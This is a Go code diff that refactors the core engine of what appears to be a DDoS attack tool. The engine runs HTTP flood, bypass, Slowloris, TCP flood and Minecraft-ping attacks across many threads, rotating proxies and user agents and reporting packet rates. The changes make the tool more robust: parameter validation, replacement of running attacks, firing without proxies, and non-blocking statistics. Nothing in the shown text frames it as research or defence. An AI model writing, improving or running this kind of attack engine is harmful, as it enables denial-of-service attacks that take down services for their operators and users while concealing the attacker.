@@ -12,11 +12,11 @@ import (
 type AttackKind string
 
 const (
-	HTTPFlood        AttackKind = "http_flood"
-	HTTPBypass       AttackKind = "http_bypass"
-	HTTPSlowloris    AttackKind = "http_slowloris"
-	TCPFlood         AttackKind = "tcp_flood"
-	MinecraftPing    AttackKind = "minecraft_ping"
+	HTTPFlood     AttackKind = "http_flood"
+	HTTPBypass    AttackKind = "http_bypass"
+	HTTPSlowloris AttackKind = "http_slowloris"
+	TCPFlood      AttackKind = "tcp_flood"
+	MinecraftPing AttackKind = "minecraft_ping"
 )
 
 type AttackWorker interface {
@@ -121,6 +121,17 @@ func (e *Engine) Registry() *Registry {
 }
 
 func (e *Engine) Start(attackID string, params AttackParams, proxies []Proxy, userAgents []string) *AttackInstance {
+	if err := ValidateParams(params); err != nil {
+		log.Error().Err(err).Str("attack_id", attackID).Msg("invalid attack parameters")
+		return nil
+	}
+
+	worker, ok := e.registry.Get(params.Method)
+	if !ok {
+		log.Error().Str("kind", string(params.Method)).Msg("attack kind not registered")
+		return nil
+	}
+
 	ctx, cancel := context.WithTimeout(context.Background(), params.Duration)
 
 	instance := &AttackInstance{
@@ -132,23 +143,18 @@ func (e *Engine) Start(attackID string, params AttackParams, proxies []Proxy, us
 	}
 
 	e.mu.Lock()
+	if previous, exists := e.attacks[attackID]; exists {
+		previous.Cancel()
+	}
 	e.attacks[attackID] = instance
 	e.mu.Unlock()
-
-	worker, ok := e.registry.Get(params.Method)
-	if !ok {
-		log.Error().Str("kind", string(params.Method)).Msg("attack kind not registered")
-		cancel()
-		return nil
-	}
 
 	threads := params.Threads
 	if threads <= 0 {
 		threads = 4
 	}
 
-	go e.runAggregator(ctx, instance)
-	go e.runThreads(ctx, instance, worker, proxies, userAgents, threads)
+	go e.runAttack(ctx, instance, worker, proxies, userAgents, threads)
 
 	return instance
 }
@@ -161,6 +167,31 @@ func (e *Engine) Stop(attackID string) {
 	if ok {
 		instance.Cancel()
 	}
+}
+
+func (e *Engine) runAttack(ctx context.Context, instance *AttackInstance, worker AttackWorker, proxies []Proxy, userAgents []string, threads int) {
+	aggregatorDone := make(chan struct{})
+	go func() {
+		e.runAggregator(ctx, instance)
+		close(aggregatorDone)
+	}()
+
+	e.runThreads(ctx, instance, worker, proxies, userAgents, threads)
+	<-aggregatorDone
+
+	total := atomic.LoadInt64(&instance.TotalSent)
+	e.sendStats(instance, AttackStats{
+		Timestamp:    time.Now(),
+		TotalPackets: total,
+		Proxies:      instance.ProxyCount,
+	})
+	close(instance.StatsCh)
+
+	e.mu.Lock()
+	if current, exists := e.attacks[instance.ID]; exists && current == instance {
+		delete(e.attacks, instance.ID)
+	}
+	e.mu.Unlock()
 }
 
 func (e *Engine) runThreads(ctx context.Context, instance *AttackInstance, worker AttackWorker, proxies []Proxy, userAgents []string, threads int) {
@@ -182,25 +213,24 @@ func (e *Engine) runThread(ctx context.Context, instance *AttackInstance, worker
 	defer ticker.Stop()
 
 	fire := func() {
-		if len(proxies) == 0 {
-			return
+		selectedProxy := Proxy{}
+		if len(proxies) > 0 {
+			selectedProxy = proxies[time.Now().UnixNano()%int64(len(proxies))]
 		}
-		proxy := proxies[time.Now().UnixNano()%int64(len(proxies))]
 		ua := ""
 		if len(userAgents) > 0 {
 			ua = userAgents[time.Now().UnixNano()%int64(len(userAgents))]
 		}
 
-		go func() {
-			if err := worker.Fire(ctx, instance.Params, proxy, ua, instance.StatsCh); err != nil {
-				if instance.Params.Verbose {
-					instance.StatsCh <- AttackStats{
-						Timestamp: time.Now(),
-						Log:       "error: " + err.Error(),
-					}
-				}
+		if err := worker.Fire(ctx, instance.Params, selectedProxy, ua, instance.StatsCh); err != nil {
+			if instance.Params.Verbose {
+				e.sendStats(instance, AttackStats{
+					Timestamp: time.Now(),
+					Log:       "error: " + err.Error(),
+				})
 			}
-		}()
+			return
+		}
 
 		atomic.AddInt64(&instance.TotalSent, 1)
 	}
@@ -227,33 +257,28 @@ func (e *Engine) runAggregator(ctx context.Context, instance *AttackInstance) {
 	for {
 		select {
 		case <-ctx.Done():
-			total := atomic.LoadInt64(&instance.TotalSent)
-			instance.StatsCh <- AttackStats{
-				Timestamp:    time.Now(),
-				PacketsPerS:  total - lastTotal,
-				TotalPackets: total,
-				Proxies:      instance.ProxyCount,
-			}
-			close(instance.StatsCh)
-
-			e.mu.Lock()
-			delete(e.attacks, instance.ID)
-			e.mu.Unlock()
 			return
 		case <-ticker.C:
 			total := atomic.LoadInt64(&instance.TotalSent)
 			delta := total - lastTotal
 			if delta > 0 || first {
-				instance.StatsCh <- AttackStats{
+				e.sendStats(instance, AttackStats{
 					Timestamp:    time.Now(),
 					PacketsPerS:  delta,
 					TotalPackets: total,
-Proxies:      instance.ProxyCount,
-				}
+					Proxies:      instance.ProxyCount,
+				})
 				first = false
 			}
 			lastTotal = total
 		}
+	}
+}
+
+func (e *Engine) sendStats(instance *AttackInstance, stats AttackStats) {
+	select {
+	case instance.StatsCh <- stats:
+	default:
 	}
 }
 
